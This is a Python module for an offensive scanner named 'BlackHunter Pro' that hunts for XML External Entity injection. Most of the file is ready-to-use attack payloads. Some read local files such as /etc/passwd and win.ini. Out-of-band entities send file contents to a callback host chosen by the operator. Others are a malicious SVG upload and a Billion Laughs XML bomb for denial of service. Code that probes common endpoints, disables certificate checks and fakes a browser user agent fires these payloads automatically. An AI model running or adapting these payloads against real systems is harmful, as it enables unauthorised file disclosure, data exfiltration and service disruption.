# vulns/xxe.py
# BlackHunter Pro - XXE Scanner
# Detects: XML External Entity Injection (Basic, Blind, OOB)

import re
import time
import uuid
import requests
from urllib.parse import urlparse, urljoin, parse_qs
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class XXEScanner:
    """
    XML External Entity (XXE) Scanner
    - Basic XXE detection
    - File disclosure (in-band)
    - Blind XXE (OOB via DNS/HTTP)
    - Parameter entity attacks
    - SOAP/XML endpoint detection
    - SVG/Office document XXE
    """

    # =============================================
    # XXE PAYLOADS
    # =============================================

    BASIC_PAYLOADS = [
        # File disclosure
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',

        # Basic entities
        '<?xml version="1.0"?><!DOCTYPE root [<!ELEMENT root ANY><!ENTITY xxe "test">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe "XXE_MARKER">]><root>&xxe;</root>',

        # Parameter entities
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',

        # UTF-16 encoded
        '\xff\xfe<\x00?\x00x\x00m\x00l\x00',
    ]

    OOB_PAYLOADS = [
        # Out-of-band
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{callback}/{token}">%remote;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{callback}/{token}">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{callback}/{token}.dtd">%remote;%int;%send;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{callback}/{token}.dtd">%dtd;]><root/>',

        # DNS only
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{token}.{callback}">]><root>&xxe;</root>',
    ]

    # =============================================
    # SUCCESS INDICATORS
    # =============================================

    SUCCESS_INDICATORS = [
        'root:x:0:0',
        'root:!:0:0',
        'daemon:x:',
        '[extensions]',
        '[fonts]',
        '[mci extensions]',
        'XXE_MARKER',
        'BEGIN RSA PRIVATE KEY',
        'localhost',
    ]

    # =============================================
    # XXE-PRONE ENDPOINTS
    # =============================================

    XML_PATHS = [
        '/api/xml',
        '/api/v1/xml',
        '/api/v2/xml',
        '/xmlrpc.php',
        '/soap',
        '/ws',
        '/webservice',
        '/services',
        '/service',
        '/rss',
        '/feed',
        '/sitemap.xml',
        '/xml',
        '/api/soap',
    ]

    # =============================================
    # CONTENT TYPES
    # =============================================

    CONTENT_TYPES = [
        'application/xml',
        'text/xml',
        'application/soap+xml',
        'application/xhtml+xml',
    ]

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.callback_domain = None

    # =============================================
    # SET CALLBACK
    # =============================================

    def set_callback(self, domain):
        """Set callback domain for OOB testing"""
        self.callback_domain = domain
        print(f"{Fore.GREEN}[+] Callback: {domain}")

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute XXE detection"""
        print(f"{Fore.CYAN}[*] XXE Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print()

        # Test target itself
        self._test_endpoint(self.target)

        # Test XML-prone paths
        for path in self.XML_PATHS:
            url = urljoin(self.target + '/', path.lstrip('/'))
            try:
                r = self.session.get(url, timeout=5, verify=False)
                if r.status_code in [200, 400, 500]:
                    self._test_endpoint(url)
            except:
                continue

        return self.vulnerabilities

    # =============================================
    # TEST ENDPOINT
    # =============================================

    def _test_endpoint(self, url):
        """Test a single endpoint for XXE"""

        # Test basic payloads
        self._test_basic(url)

        # Test OOB payloads
        if self.callback_domain:
            self._test_oob(url)

    # =============================================
    # BASIC XXE
    # =============================================

    def _test_basic(self, url):
        """Test basic XXE (in-band)"""
        for payload in self.BASIC_PAYLOADS:
            for content_type in self.CONTENT_TYPES:
                try:
                    headers = {'Content-Type': content_type}
                    r = self.session.post(
                        url,
                        data=payload,
                        headers=headers,
                        timeout=self.timeout,
                        verify=False
                    )

                    # Check for file content
                    for indicator in self.SUCCESS_INDICATORS:
                        if indicator in r.text:
                            print(f"{Fore.RED}  [!] XXE Found!")
                            print(f"{Fore.RED}      URL: {url}")
                            print(f"{Fore.RED}      Payload: {payload[:70]}")
                            print(f"{Fore.RED}      Evidence: {indicator}")

                            self.vulnerabilities.append({
                                'type': 'XXE (In-band File Disclosure)',
                                'url': url,
                                'payload': payload[:200],
                                'evidence': indicator,
                                'severity': 'CRITICAL',
                            })
                            return True

                except requests.Timeout:
                    continue
                except Exception:
                    continue

        return False

    # =============================================
    # OOB XXE
    # =============================================

    def _test_oob(self, url):
        """Test blind XXE via callback"""
        for payload_template in self.OOB_PAYLOADS:
            token = uuid.uuid4().hex[:12]
            payload = payload_template.format(
                token=token,
                callback=self.callback_domain
            )

            for content_type in self.CONTENT_TYPES:
                try:
                    headers = {'Content-Type': content_type}
                    self.session.post(
                        url,
                        data=payload,
                        headers=headers,
                        timeout=self.timeout,
                        verify=False
                    )

                    print(f"{Fore.YELLOW}  [*] OOB XXE test sent: {token}")

                    self.vulnerabilities.append({
                        'type': 'XXE (Blind / OOB)',
                        'url': url,
                        'payload': payload[:200],
                        'token': token,
                        'callback': f"{token}.{self.callback_domain}",
                        'verified': False,
                        'severity': 'CRITICAL',
                    })
                    break
                except:
                    continue

        return True

    # =============================================
    # SVG XXE
    # =============================================

    def test_svg_xxe(self, upload_url):
        """Test XXE via SVG upload"""
        svg_payload = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
    <text>&xxe;</text>
</svg>'''

        try:
            files = {'file': ('test.svg', svg_payload, 'image/svg+xml')}
            r = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

            for indicator in self.SUCCESS_INDICATORS:
                if indicator in r.text:
                    print(f"{Fore.RED}  [!] SVG XXE Found!")
                    print(f"{Fore.RED}      Upload: {upload_url}")

                    self.vulnerabilities.append({
                        'type': 'XXE (SVG Upload)',
                        'url': upload_url,
                        'evidence': indicator,
                        'severity': 'HIGH',
                    })
                    return True
        except:
            pass

        return False

    # =============================================
    # XML BOMB (DoS Test)
    # =============================================

    def test_xml_bomb(self, url):
        """Test for XML bomb vulnerability (Billion Laughs)"""
        bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>'''

        try:
            start = time.time()
            headers = {'Content-Type': 'application/xml'}
            r = self.session.post(url, data=bomb, headers=headers, timeout=self.timeout, verify=False)
            elapsed = time.time() - start

            if elapsed > 5:
                print(f"{Fore.YELLOW}  [!] Possible XML Bomb (delay: {elapsed:.2f}s)")

                self.vulnerabilities.append({
                    'type': 'XML Bomb (Potential DoS)',
                    'url': url,
                    'delay': elapsed,
                    'severity': 'MEDIUM',
                })
                return True
        except requests.Timeout:
            print(f"{Fore.YELLOW}  [!] Possible XML Bomb (timeout)")

            self.vulnerabilities.append({
                'type': 'XML Bomb (Potential DoS)',
                'url': url,
                'evidence': 'timeout',
                'severity': 'MEDIUM',
            })
            return True
        except:
            pass

        return False

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  XXE SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Vulnerabilities: {len(self.vulnerabilities)}")

        for v in self.vulnerabilities:
            print(f"{Fore.RED}[!] {v['type']} - {v.get('url', 'N/A')}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["XXEScanner"]